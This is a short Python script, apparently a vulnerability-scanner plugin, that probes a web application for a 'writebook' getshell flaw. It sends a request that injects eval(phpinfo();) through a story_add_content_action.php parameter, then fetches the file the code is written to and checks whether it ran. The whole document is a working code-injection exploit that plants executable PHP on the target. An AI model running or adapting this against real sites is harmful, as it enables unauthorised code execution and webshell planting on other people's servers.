import requests
from termcolor import cprint


class writebook_getshell:

    def __init__(self,url):
        self.url = url

    def checktrace(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/member/story_add_content_action.php?body=eval(phpinfo(););&chapterid=1"
        if '://' not in self.url:
            self.url = 'http://' + self.url + '/'
        url = self.url
        vulnurl = url + payload

        try:
            r = requests.get(url=vulnurl,headers=headers)
            m = requests.get(url=url+'data/textdata/1/bk1.php',headers=headers)
            if m.status_code == 200 and "phpinfo" in r.content:
                cprint("target may be hava writebook.php getshell:" + vulnurl,"red")
        except:
            return False
